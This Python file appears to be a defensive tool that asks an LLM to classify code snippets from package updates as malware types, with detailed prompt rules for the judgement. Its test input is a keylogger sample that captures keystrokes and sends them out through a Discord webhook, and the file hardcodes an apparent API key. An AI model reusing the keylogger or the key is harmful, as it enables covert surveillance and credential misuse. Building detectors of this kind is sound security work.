import os
from openai import OpenAI
import base64
from google import genai
from openai import types
import json

SYSTEM_PROMPT = """
### ROLE
You are an elite Supply Chain Security Expert and Code Auditor. Your mission is to detect, classify, and explain malicious intent within software package updates based on "Realized Capability".

### CORE PHILOSOPHY
1. **INTENT OVER IMPLEMENTATION**: 
   - Focus on ARCHITECTURE and INTENT.
   - IGNORE superficial faults (syntax errors, missing imports, undefined variables) IF the malicious logic flow is visible.
2. **CONTEXT IS KING (The "Honest Code" Rule)**:
   - Distinguish between "Admin Utilities" (Authorized actions) and "Malware" (Surreptitious actions).
   - A function named `delete_temp_files` doing file deletion is BENIGN.
   - A function named `init_display` doing file deletion is MALICIOUS.

### ATTACK TYPE SUCCESS CRITERIA MATRIX (THE LAW)

[Type A: InfoStealer / Spyware]
- Goal: Steal HIGH-VALUE Secrets (env vars, passwords, tokens, cookies, keystrokes, SSH keys).
- **ANTI-DEFINITION (BENIGN)**: 
  * "Diagnostic/Status Reporting": Code that collects system metadata (Public IP, Hostname, OS version, CPU usage, Uptime) AND sends it to a logging channel (especially in `on_ready` or `status` functions) is BENIGN.
  * Exception: If the IP collection is combined with stealing Credentials/Tokens, it IS Malware.
- Full: Collects AND Exfiltrates data (HTTP/DNS/SMTP).

[Type B: Backdoor / RAT / Reverse Shell]
- Goal: Unauthorized remote access/execution.
- Full: Execution Logic + Connectivity (C2/Listener).

[Type C: Ransomware]
- Goal: Deny access via encryption.
- Full: 
  1. **Active Encryption Logic**: The specific function performing file locking/encryption is PRESENT and defined (e.g., AES/RSA loops).
  2. **Ransom Demand**: Ransom note generation or deployment logic is present.

[Type D: Wiper]
- Goal: Irreversibly destroy data for sabotage.
- **ANTI-DEFINITION (BENIGN)**: Utility functions explicitly named for cleanup (e.g., `clean_cache`, `delete_images`) operating on safe scopes are NOT malware.
- Full: 
  1. Targets High-Value/System Paths (/, /etc, C:\\Windows).
  2. Indiscriminate/Recursive deletion without filters.
  3. Deceptive Intent (Function name hides the behavior).

[Type E: Clipboard Hijacker]
- Goal: Swap crypto addresses in clipboard.
- Full: Successfully reads AND overwrites clipboard.

[Type F: File Infector]
- Goal: Self-replication by infecting other files.
- Full: Successfully locates target files AND injects them.

[Type G: Logic Bomb]
- Goal: Delayed execution based on conditions.
- Full: Trigger (Time/Env) + Malicious Payload connected.

[Type H: Keylogger / Keystroke Logger]
- Goal: Capture keystrokes stealthily and exfiltrate.
- Full: Captures keystrokes AND successfully stores and exfiltrates them.

[Type I: Malware Builder ]
- Goal: Generate malware binaries/payloads.
- Full: Contains complete build logic (e.g., uses PyInstaller/Nuitka with all necessary parameters).

[Type J: Uncategorized High-Impact]
- Full: Any other specific logic causing severe harm/exposure.


### CLASSIFICATION LEVELS

1. **Full Attack Chain (Actionable Threat)**
   - **Criteria**: Meets ALL criteria in the Matrix. The malicious logic is complete, configured, and capable of execution.
   - **Verdict**: MALICIOUS UPDATE.

2. **Core Attack Chain (Latent Threat / High Confidence)**
   - **Criteria**: The code misses critical components to execute malicious behavior (e.g., missing exfiltration, missing execution trigger, missing ransom note).
    - **Constraint**: There must be a visible **Action-Logic** (e.g., a function capturing keys, writing to a file, or processing data), even if incomplete.
    - **NOT Core**: Mere definitions (Classes, Variables, Imports) without functional body code are NOT Core.
   - **Verdict**: WARNING UPDATE.

3. **Undetermined Call Chain (Ambiguous / Low Confidence)**
   - **Criteria**: Isolated **"Dual-Use" components** that lack a demonstrable malicious context.
   - **Verdict**: BENIGN (Treat as Noise/Safe unless combined with other indicators).

4. **Benign Artifact (Safe / Authorized)**
   - **Criteria**: The code matches the "ANTI-DEFINITION" or "Honest Code Rule".
   - **Verdict**: BENIGN UPDATE.


### [CRITICAL REFERENCE EXAMPLES] (Learn from these cases)

**CASE 1: The "Skeleton" Trap (Inert Code)**
- **Input**: 
  ```python
  class Keylogger(Thread):
      def __init__(self):
          self.log = ""
  # No on_press, no write_to_file, no send_data
CLASSIFICATION: Undetermined Call Chain.
Reasoning: Despite the malicious name "Keylogger", the code is purely declarative. It contains NO "Operational Logic" (Active Verbs). Without a function that actually captures, stores, or sends data, it is inert/dead code.

**CASE 2: The "Dual-Use" Listener (Ambiguous)**
- **Input**: 
  ```python
  def on_press(key):
      print(f"Key  pressed")
      if key == Key.esc: return False
Verdict: Undetermined Call Chain (or Benign).
Reasoning: This is standard input handling (Dual-Use). There is no attempt to hide, no writing to hidden files, and no network exfiltration. It lacks "Malicious Context".

CASE 3: The "Real" Core (Malicious Intent Visible)
Input:
code
Python
# Writes to a hidden system file
def on_press(key):
    with open("/tmp/.hidden_log", "a") as f: 
        f.write(str(key))
Verdict: Core Attack Chain.
Reasoning: While logic is incomplete (no network send), the intent is malicious because it writes to a HIDDEN file (.hidden_log). The "Stealth" behavior upgrades it from Dual-Use to Core.
"""

ASSERTION_PROMPT = """
Analyze the provided code snippet: {code_snippet}

### INSTRUCTIONS
1. **Identify Intent**: Determine the potential malware type based on the "ATTACK TYPE SUCCESS CRITERIA MATRIX" defined in the System Instructions.
2. **Check for Benign Context**: Apply the "ANTI-DEFINITION" rules. If the code looks like a standard utility, mark it as "Benign Artifact".
3. **Determine Chain Status**:
   - If it is malicious, determine if it is "Full" or "Core" based on the Matrix.
   - Be specific about what is missing if it is "Core".

### OUTPUT REQUIREMENT
Provide a structured response:
- **Malware Type:** (e.g., "Type D: Wiper" or "None")
- **Classification:** "Full Attack Chain" | "Core Attack Chain" | "Fragmented Attack Chain" | "Benign Artifact"
- **Missing Components:** Critical missing steps (refer to the Matrix).
- **Potential Impact:** Description of consequences.
- **Threat Level:** High/Medium/Low.
- **Reasoning:** Explain why it fits the specific criteria.
"""

CHECK_PROMPT = """ 
You are the Supreme Quality Assurance Auditor. Review the PREVIOUS RESPONSE and the ORIGINAL CODE.

PREVIOUS RESPONSE: 
{response}

ORIGINAL CODE SNIPPET: 
{code_snippet}

### AUDIT EXECUTION PLAN

**Step 1: The "Sanity Check" (Benign Filter)**
- Verify if the code matches the "ANTI-DEFINITION" or "Honest Code Rule".
- If a function named `cleanup` or `delete_cache` is deleting files, or `on_ready` is logging IP, **OVERRIDE** to "Benign Artifact".

**Step 2: The "Skeleton Check" (Inert Filter)**
- Look at the code structure. Is it purely declarative (Classes, Imports, `__init__`) without any active logic flow (e.g., no `on_press`, no `encrypt_loop`, no `socket.send`)?
- If YES, it is Inert/Skeleton code. **OVERRIDE** to "Undetermined Call Chain".

**Step 3: The "Payload Check" (Core vs Full)**
- If the code passes Step 1 & 2 and is deemed Malicious:
- Check the "Missing Components".
- **CRITICAL RULE**: If the missing component is the **CORE PAYLOAD FUNCTION BODY** (e.g., `Encrypt` function is called but not defined, or logic flow implies `upload` but code is missing), you CANNOT classify it as "Full".
- **CRITICAL RULE**: If the code self can do harm to the system (e.g., file deletion, keylogging, clipboard overwrite), it MUST be at least "Core".

### FINAL OUTPUT
Respond in JSON format:
{{
  "Classification": "Full Attack Chain" | "Core Attack Chain" | "Undetermined Call Chain" | "Benign Artifact",
  "Missing_Components": "List of critical logic gaps (or 'None').",
  "Malware_Type": "String",
  "Threat_Level": "High" | "Medium" | "Low",
  "Reasoning": "Final verdict explaining the decision process (especially if overridden).",
  "Potential_Impact": "Specific damage description."
}}
"""

STEP1_PROMPT = """
You are a Supply Chain Security Expert. Analyze the following code snippet to identify its **PRIMARY INTENT**.

CODE SNIPPET:
{code_snippet}

---
### REFERENCE: MALWARE INTENT DEFINITIONS (THE MATRIX)
[Type A: InfoStealer] Goal: Steal Secrets (passwords, tokens). *Anti-Def*: Diagnostic logs (IP/Hostname) are Benign.
[Type B: Backdoor/RAT] Goal: Remote access/execution.
[Type C: Ransomware] Goal: Deny access via encryption.
[Type D: Wiper] Goal: Data destruction. 
**ANTI-DEFINITION (BENIGN)**: 
  * "Utility/Cleanup": Utility functions named for cleanup (e.g., `clean_cache`) on safe scopes.
  * **"Uninstaller / Self-Cleanup" (CRITICAL)**: Code that deletes specific application folders (e.g., in AppData/Temp) or **REMOVES** registry startup keys. This is standard uninstallation logic, NOT a Wiper.
[Type E: Clipper] Goal: Swap clipboard crypto addresses.
[Type F: File Infector] Goal: Inject code into other files.
[Type G: Logic Bomb] Goal: Delayed malicious execution based on conditions.
[Type H: Keylogger] Goal: Stealthy input capture. *Anti-Def*: Hotkeys/Game inputs are Benign.
[Type I: Builder] Goal: Generate malware.
[Type J: Dropper / Downloader]Goal: Download and execute malicious payloads. Or Extracts payload from Internal Sources (e.g., Base64 strings, embedded resources, Zip extraction) and Replicates itself to a new location.
ANTI-DEFINITION (BENIGN):
"Installers / Auto-Updaters": Code that downloads files from Official/Trusted Domains.
Logic: If the URL matches the package metadata or well-known trusted sources, it is Benign.
[Type K: System Interference]Goal: Causes network/keyboard/filesystem disorganization or instability.
[Type L: Network Propagator]
- Goal: Self-replicate and spread across networks (Lateral Movement) without user interaction.
- Critical Distinction: Unlike Type F (which infects local files), Type L infects *other machines*(usually network neighbors).
[Type M: High-Impact] Goal: Severe harm/exposure that influences system integrity or usability.
---

### TRIAGE LOGIC (STRICT DECISION FLOW)

**1. CHECK FOR BENIGN CONTEXT (The "Anti-Definition" Filter)**
   - Does the code match a legitimate use case explicitly?
   - **Verdict**: If YES -> **Benign Artifact**.

**2. CHECK FOR AMBIGUITY (The "Dual-Use" Filter)**
   - **Scenario**: The code uses dangerous tools (`ngrok`, `pynput`, `subprocess`, `cryptography`) BUT lacks "Malicious Indicators".
   - **Rule A (Setup vs Attack)**: If the code ONLY downloads/installs/configures a tool (e.g., `wget ngrok`) but does NOT execute it with malicious args -> **Undetermined**.
   - **Rule B (Skeleton Code)**: If the code defines classes/imports (e.g., `class Keylogger`) but lacks operational logic (no `hook`, no `send`) -> **Undetermined**.
   - **Verdict**: If it falls here -> **Undetermined Call Chain**.

**3. CHECK FOR MALICE (The "Malicious Indicator" Filter)**
   - If it survives filters 1 & 2, look for **Positive Proof of Malice**:
   - **Indicator A (Targeting)**: Hardcoded system paths (`/etc/passwd`, `/`, `C:\\Windows`) OR sensitive info.
   - **Indicator B (Evasion)**: Obfuscation (Base64/Hex/Eval), hidden file attributes, or anti-analysis checks.
   - **Indicator C (Intentional Chaos)**: keyboard locking, network disconnection, file system disruption, etc.
   - **Indicator D (Aggressive Action)**: `rm -rf /`, `encrypt` without key saving, `exec` connecting to C2.
   - **Verdict**: If ANY indicator exists -> **Malicious** (Assign Type A-L).
   
   
### [CRITICAL REFERENCE EXAMPLES] (Learn from these cases)

**CASE 1: The "Skeleton" Trap (Inert Code)**
- **Input**: 
  ```python
  class Keylogger(Thread):
      def __init__(self):
          self.log = ""
  # No on_press, no write_to_file, no send_data
CLASSIFICATION: Undetermined Call Chain.
Reasoning: Despite the malicious name "Keylogger", the code is purely declarative. It contains NO "Operational Logic" (Active Verbs). Without a function that actually captures, stores, or sends data, it is inert/dead code.

**CASE 2: The "Dual-Use" Listener (Ambiguous)**
- **Input**: 
  ```python
  def on_press(key):
      print(f"Key  pressed")
      if key == Key.esc: return False
Verdict: Undetermined Call Chain (or Benign).
Reasoning: This is standard input handling (Dual-Use). There is no attempt to hide, no writing to hidden files, and no network exfiltration. It lacks "Malicious Context".

CASE 3: The "Real" Core (Malicious Intent Visible)
Input:
code
Python
# Writes to a hidden system file
def on_press(key):
    with open("/tmp/.hidden_log", "a") as f: 
        f.write(str(key))
Verdict: Core Attack Chain.
Reasoning: While logic is incomplete (no network send), the intent is malicious because it writes to a HIDDEN file (.hidden_log). The "Stealth" behavior upgrades it from Dual-Use to Core.

### FINAL OUTPUT FORMAT (JSON ONLY)
{{
    "Detected Category": "Malicious" | "Undetermined" | "Benign",
    "Malware Type": "Type X (if Malicious) / None",
    "Primary Logic": "Brief description of what the code does",
    "Decision Factor": "e.g., Setup only (Undetermined) OR Hardcoded system path (Malicious)"
}}

"""

STEP2_PROMPT = """
You are a Code Auditor. Based on the Intent Analysis from Step 1, determine the "Realized Capability" (Full vs Core).

CODE SNIPPET:
{code_snippet}

STEP 1 ANALYSIS:
{step1_analysis}

---
REFERENCE: FULL ATTACK CHAIN CRITERIA

[Type A: InfoStealer / Spyware]
- Full Criteria:
 1. Data Collection: Accesses Sensitive Sources (Env vars, Files, Browser data, Wallets).
 2. Exfiltration Channel: Successfully implements a transmission mechanism (HTTP, DNS, SMTP, Webhook, WebSocket, or Public API).
 3. Data Flow Connectivity: The payload being transmitted MUST be traceable back to the sensitive data collected in Step 1.
  
[Type B: Backdoor / RAT / Reverse Shell]
- Full Criteria:
 1. Command Execution: Implements logic to run arbitrary commands (e.g., subprocess, os.system, eval).
 2. Remote Connectivity: Connects to an external controller (Reverse Shell) OR opens a local port (Bind Shell) to receive instructions.

[Type C: Ransomware]
- Full Criteria: 
 1. File Traversal: Code to iterate through directories/drives (Goal: Find targets).
 2. Active Encryption/Locking: The specific function for encryption is PRESENT and DEFINED (Not just a call).
 3. Extortion Intent: Code to drop a ransom note, or demand payment.
 Note on "Extortion":
"Extortion Intent" is proved ONLY by the presence of a Ransom Note/Demand.
File encryption/deletion alone proves "Destructive Intent" or "Sabotage", NOT "Extortion".
    
[Type D: Wiper]
Full Criteria:
 1. Mass Destruction Logic: Iterates through directories to delete/overwrite files.
 2. Lack of Constraints: Operates indiscriminately (e.g., rm -rf /, deletes all extensions) OR Targets System/Critical Paths.
Note: "Deceptive Intent" is a supporting indicator, not a strict requirement for "Full".
Variant: Destructive Encryption: Encrypting files WITHOUT saving/exfiltrating the key (making recovery impossible) counts as a Full Wiper, even if no files are deleted.

[Type E: Clipboard Hijacker]
Full Criteria:
 1. Pattern Matching: Uses Regex to identify specific patterns (e.g., Crypto Wallet addresses) in clipboard data.
 2. Replacement implementation: Overwrites the clipboard with a hardcoded attacker address.

[Type F: File Infector]
- Full Criteria: Successfully locates target files AND injects them.

[Type G: Logic Bomb]
- Full Criteria: Trigger (Time/Env) + Malicious Payload connected.

[Type H: Keylogger / Keystroke Logger]
Full Criteria:
 1. Active Capture: Hooks keyboard events or reads input streams.
 **CRITICAL**: Processing data passed via function arguments (e.g., `def send(keys)`) does NOT count as Active Capture.
 2. Data Leakage: Code implementation to Store (to HIDDEN FILE) AND Exfiltrate (Network) the captured logs.
 **CRITICAL**: The actual implementation body (e.g., `requests.post`, `f.write`) must be **VISIBLE** and **SYNTACTICALLY COMPLETE** in the snippet. 

[Type I: Malware Builder]
- Full Criteria: Contains complete build logic and implementation (e.g., uses PyInstaller/Nuitka with all necessary parameters).

[Type J: Dropper / Downloader]
- Full Criteria: Downloads payloads from Untrusted/Hardcoded Source and executes malicious payloads. Or Extracts payload from Internal Sources (e.g., Base64 strings, embedded resources, Zip extraction) and Replicates itself to a new location.

[Type K: System Interference]
- Full Criteria: Implements disruptive actions (e.g., network disconnection, disabling input devices, altering system settings) that degrade system usability or integrity.

[Type L: Network Propagator]
- Full Criteria: 
  1. **Target Discovery**: Logic to generate IP ranges, scan subnets, or harvest contact lists (Email/SSH known_hosts).
  2. **Propagation Mechanism**: Logic to COPY the payload to the target (via SSH/SCP, SMB, Email, or Exploit).

[Type M: Uncategorized High-Impact]
- Full Criteria: The harmful action is fully implemented and executable.
---

### CLASSIFICATION RULES

**Core Attack Chain**: 
   - Malicious Intent is clear.
   - BUT fails the "Full Criteria" due to missing critical components.
   - If the missing component is **Auxiliary** (e.g., logging, watermarking, version printing, fancy error handling), IGNORE it. Do NOT classify as Core.

**Full Attack Chain**: 
   - Meets ALL "Full Criteria" for the specific Type.
   - Logic is complete, configured, and actionable.

 [THE "CONTEXTUAL VISIBILITY" RULE (CRITICAL)]:
   - **Goal**: Verify if critical logic (Network/Encryption/malicious payload) is actually present.
   - **Procedure**:
     A. **Standard Libraries**: If it uses `os`, `subprocess`, `requests`, `socket`, `smtplib`, etc. -> **VERIFIED**.
     B. **In-Context Definitions (The "Bundled" Check)**: 
        - If the code imports a custom class (e.g., `from core.bsky_client import BskyClient`), you MUST search the **ENTIRE** snippet for `class BskyClient` or `def BskyClient`. Same as sub-functions.
        - **IF FOUND**: Treat it as **VERIFIED / FULLY IMPLEMENTED**. (Ignore the import statement as it might be a concatenated file).
        - **IF NOT FOUND**: Treat it as **MISSING / EXTERNAL**. -> Downgrade to **Core**.
   - C. **External Calls**: If it calls functions/payloads NOT defined in the snippet and NOT from standard libraries (e.g., `upload_data()`, `encrypt_files()`), TREAT them as **MISSING / EXTERNAL** -> Downgrade to **Core**.

Quality != Capability:
Do NOT downgrade to "Core" just because the code lacks robust error handling, retry logic, or advanced persistence, providing the primary Attack Loop (Command -> Execution -> Exfiltration) is logically complete.

### FINAL OUTPUT (JSON ONLY)
{{
  "Classification": "Full Attack Chain" | "Core Attack Chain" | "Undetermined Call Chain" | "Benign Artifact",
  "Malware_Type": "String (e.g., 'Type C: Ransomware')",
  "Missing_Components": "List critical gaps or 'None'.",
  "Threat_Level": "High" | "Medium" | "Low",
  "Reasoning": "Explain the decision based on the Full Criteria."
}}
"""

class LLM_Evaluate:
    def __init__(self,api_key, base_url):
        self.client = OpenAI(
            api_key=api_key,
            base_url=base_url,
        )
        self.conversation_history = []

    def malware_analyze_two_steps(self, code_snippet):
        assertion_prompt = STEP1_PROMPT.format(code_snippet=code_snippet)
        completion = self.client.chat.completions.create(
            model="deepseek-v3-1-250821",
            messages=[
                {"role": "user", "content": assertion_prompt}
            ],
            temperature=0,
            seed=42,
            response_format={"type": "json_object"}
        )
        
        response_1 = json.loads(completion.choices[0].message.content)
        if response_1.get("Detected Category") == "Benign" or response_1.get("Detected Category") == "Undetermined":
            return response_1
        # print("Initial LLM Response:")
        # print(response_1)
        check_prompt = STEP2_PROMPT.format(step1_analysis=response_1, code_snippet=code_snippet)
        completion = self.client.chat.completions.create(
            model="deepseek-v3-1-250821",
            messages=[
                {"role": "user", "content": check_prompt}
            ],
            response_format={"type": "json_object"},
            temperature=0,
            seed=42
        )
        response_2 = completion.choices[0].message.content
        return json.loads(response_2)  # 解析JSON字符串为Python字典
        

    def malware_analyze(self, code_snippet):
        assertion_prompt = ASSERTION_PROMPT.format(code_snippet=code_snippet)
        completion = self.client.chat.completions.create(
            model="deepseek-v3-1-250821",
            messages=[
                {"role": "system", "content": SYSTEM_PROMPT},
                {"role": "user", "content": assertion_prompt}
            ],
            temperature=0,
            seed=42
        )
        
        response_1 = completion.choices[0].message.content
        # print("Initial LLM Response:")
        # print(response_1)
        check_prompt = CHECK_PROMPT.format(response=response_1, code_snippet=code_snippet)
        completion = self.client.chat.completions.create(
            model="deepseek-v3-1-250821",
            messages=[
                {"role": "system", "content": SYSTEM_PROMPT},
                {"role": "user", "content": check_prompt}
            ],
            response_format={"type": "json_object"},
            temperature=0,
            seed=42
        )
        response_2 = completion.choices[0].message.content
        return json.loads(response_2)  # 解析JSON字符串为Python字典
        
    
    def sensitive_api_check(self, code_snippet):
        completion = self.client.chat.completions.create(
            # 将推理接入点 <Model>替换为 Model ID
            model="deepseek-r1-250120",
            messages=[
                {"role": "system", "content": "You are a professional assistant about software supply chain security."
                "I will give you a code snippet and you need to tell me if there are functions which can lead to malicious activities."
                "if there are, please list the sensitive functions. if not, please reply 'No sensitive functions found'."},
                {"role": "user", "content": code_snippet}
            ]
        )
        return completion.choices[0].message.content

    
    
    def function_behavior_generate(self, code_snippet):
        completion = self.client.chat.completions.create(
            # 将推理接入点 <Model>替换为 Model ID
            model="deepseek-r1-250120",
            messages=[
                {"role": "system", "content": "You are a professional assistant about software supply chain security."
                "I will give you a code snippet and you need to generate its function behavior."
                },
                {"role": "user", "content": code_snippet}
            ]
        )
        return completion.choices[0].message.content

if __name__ == "__main__":
    code_snippet = r'''
from pynput import keyboard
from dhooks import Webhook
import threading
import time

def on_press(key):
    try:
        log = key.char
    except AttributeError:
        return
    with open("keylog.txt", "a") as file:
        file.write(log)
def llistener():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
def send():
    with open("keylog.txt", "r") as file:
        content = file.read()
    if not content.strip():
        return
    hook.send(content)
    with open("keylog.txt", "r+") as con:
        con.seek(0)
        con.truncate()
    time.sleep(300)
thread1 = threading.Thread(target=llistener())
thread1.start()
thread2 = threading.Thread(target=send)
thread2.start()
thread1.join()
thread2.join()

'''

    llm_evaluate = LLM_Evaluate(
        api_key="57bd6c19-3b9f-4cbe-8596-63c472ca47d2",
        base_url="https://ark.cn-beijing.volces.com/api/v3"
    )
    sensitive_api_result = llm_evaluate.malware_analyze_two_steps(code_snippet)
    print("LLM Malicious Assertion Result:")
    print(sensitive_api_result)